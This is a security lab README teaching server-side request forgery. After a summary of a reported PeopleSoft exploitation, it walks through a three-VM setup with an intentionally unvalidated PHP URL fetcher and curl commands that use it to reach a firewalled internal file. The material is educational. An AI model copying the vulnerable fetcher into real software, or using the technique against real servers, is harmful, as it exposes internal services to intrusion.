## Server-Side Request Forgery (SSRF) Attack

### Real-World Example: ShinyHunters Exploits an SSRF Vulnerability in Oracle PeopleSoft

In October 2026, [The Hacker News reported](https://thehackernews.com/2026/10/shinyhunters-exploited-oracle.html) that the hacking group **ShinyHunters**, which has also been linked to a reported breach of an FBI system, exploited a critical vulnerability in Oracle PeopleSoft, identified as **CVE-2026-35273**.

Security researchers discovered that the attack involved three chained vulnerabilities, beginning with a **Server-Side Request Forgery (SSRF)** vulnerability. The SSRF allowed attackers to send requests to an internal management interface that normally trusted requests originating from `127.0.0.1` (localhost). By exploiting this trust, attackers could bypass access restrictions and ultimately achieve remote code execution without authentication.

The vulnerability was exploited as a zero-day beginning in May 2026, initially targeting universities, before expanding to other sectors.

In this lab, we will demonstrate the same fundamental SSRF concept: **an attacker who cannot directly access a protected internal service can trick a vulnerable web server into accessing it on the attacker's behalf.**

Our lab uses a simplified environment with three virtual machines and focuses on accessing a protected file rather than achieving remote code execution.

### Requirement

In this lab, you will perform a Server-Side Request Forgery (SSRF) attack to access a protected internal web server.

SSRF is a web security vulnerability that allows an attacker to trick a web application into sending HTTP requests to destinations chosen by the attacker. These requests originate from the vulnerable web server rather than from the attacker's machine.

In this lab, the attacker cannot directly access an internal web server because of firewall restrictions. However, by exploiting an SSRF vulnerability in another web application, the attacker will be able to retrieve a confidential file from the internal server.

### Setup

3 Linux VMs: Attacker, Vulnerable Web Server, Internal Web Server. All 3 VMs are located in the same network.

The following are the IP addresses for the VMs used in this README.

| VM | IP Address | Role |
|---|---|---|
| VM1 | 10.0.2.4 | Vulnerable Web Server |
| VM2 | 10.0.2.5 | Internal Web Server |
| VM3 | 10.0.2.6 | Attacker |

The vulnerable web server (VM1) runs Apache2 and PHP. The internal web server (VM2) uses Python's built-in HTTP server on port 8080.

We will configure the firewall on VM2 so that only VM1 can access its HTTP service. VM3 cannot access VM2's HTTP service directly.

### Preparation

**1. On VM2 (Internal Web Server): Create a confidential file.**

Run the following commands to create a directory and a file containing simulated confidential information.

```console
$ mkdir -p ~/ssrf-lab
$ cd ~/ssrf-lab
$ echo "Confidential lab token: SSRF-LAB-2026" > secret.txt
```

**2. On VM2: Start an HTTP server.**

We will use Python3's built-in HTTP server, so no additional web server software is needed.

```console
$ python3 -m http.server 8080 --bind 0.0.0.0
```

The server listens on port 8080 and serves files from the current directory.

The confidential file is now available at:

`http://10.0.2.5:8080/secret.txt`

Keep this server running throughout the lab.

**3. On VM2: Configure the firewall.**

We want VM1 to be able to access the internal HTTP server, but VM3 (attacker) should not be allowed to access it.

Run the following commands:

```console
$ sudo iptables -I INPUT 1 -p tcp --dport 8080 -s 10.0.2.4 -j ACCEPT
$ sudo iptables -I INPUT 2 -p tcp --dport 8080 -j DROP
```

The first rule allows VM1 (10.0.2.4) to access TCP port 8080.

The second rule blocks other machines from accessing TCP port 8080.

Verify the firewall rules:

```console
$ sudo iptables -L INPUT -n -v --line-numbers
```

**4. On VM1 (Vulnerable Web Server): Install Apache2 and PHP.**

Run the following commands:

```console
$ sudo apt update
$ sudo apt install -y apache2 php libapache2-mod-php php-curl
```

Start the Apache web server:

```console
$ sudo systemctl enable --now apache2
```

**5. On VM1: Create a vulnerable PHP application.**

Create the file `/var/www/html/fetch.php` with the following content:

```php
<?php
// Intentionally vulnerable to SSRF.

$url = $_GET['url'] ?? '';

if (empty($url)) {
    die("Usage: fetch.php?url=http://example.com");
}

$ch = curl_init($url);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);

$response = curl_exec($ch);

if ($response === false) {
    http_response_code(502);
    die("Request failed: " . curl_error($ch));
}

curl_close($ch);

header("Content-Type: text/plain");
echo $response;
?>
```

This PHP application accepts a URL through the `url` parameter, sends an HTTP request to that URL, and returns the response to the client.

Notice that the application does not validate the URL provided by the client. This is the SSRF vulnerability we will exploit.

**6. On VM1: Verify that the internal web server is accessible.**

Run:

```console
$ curl http://10.0.2.5:8080/secret.txt
```

Expected output:

```text
Confidential lab token: SSRF-LAB-2026
```

This confirms that VM1 can access the internal web server on VM2.

### Attack

**1. On VM3 (Attacker): Attempt to access the internal web server directly.**

Run:

```console
$ curl --connect-timeout 3 http://10.0.2.5:8080/secret.txt
```

The connection should time out because the firewall on VM2 blocks connections from VM3.

This confirms that the attacker cannot directly access the confidential file.

**2. On VM3: Test the vulnerable web application.**

Run:

```console
$ curl "http://10.0.2.4/fetch.php?url=http://127.0.0.1/"
```

You should see the HTML content of the Apache default page hosted on VM1.

Notice that `127.0.0.1` refers to VM1, not VM3, because the HTTP request is made by the PHP application running on VM1.

**3. On VM3: Launch the SSRF attack.**

Run:

```console
$ curl -G \
    --data-urlencode "url=http://10.0.2.5:8080/secret.txt" \
    http://10.0.2.4/fetch.php
```

Expected output:

```text
Confidential lab token: SSRF-LAB-2026
```

The attack is successful!

Although VM3 cannot directly access VM2's HTTP service, it can instruct VM1 to retrieve the confidential file on its behalf.

The HTTP request reaching VM2 originates from VM1 (10.0.2.4), which is allowed by VM2's firewall.

This demonstrates how an SSRF vulnerability can allow an attacker to bypass network access restrictions.

**4. On VM2: Observe the network traffic.**

Run the following command in another terminal:

```console
$ sudo tcpdump -i any -nn 'tcp port 80 or tcp port 8080'
```

Repeat the SSRF attack from VM3.

You should observe two separate TCP connections:

- VM3 (10.0.2.6) sends an HTTP request to VM1 (10.0.2.4) on port 80.
- VM1 (10.0.2.4) sends another HTTP request to VM2 (10.0.2.5) on port 8080.

Notice that VM2 does not receive an HTTP request directly from VM3.

This confirms that the vulnerable web application is making the HTTP request on behalf of the attacker.

### Clean up

**1. On VM2: Stop the Python HTTP server.**

Press `Ctrl+C` in the terminal running the Python HTTP server.

**2. On VM2: Remove the firewall rules added during preparation.**

If no other rules have been inserted ahead of them, the two rules can be removed using:

```console
$ sudo iptables -D INPUT -p tcp --dport 8080 -s 10.0.2.4 -j ACCEPT
$ sudo iptables -D INPUT -p tcp --dport 8080 -j DROP
```

This concludes the lab.
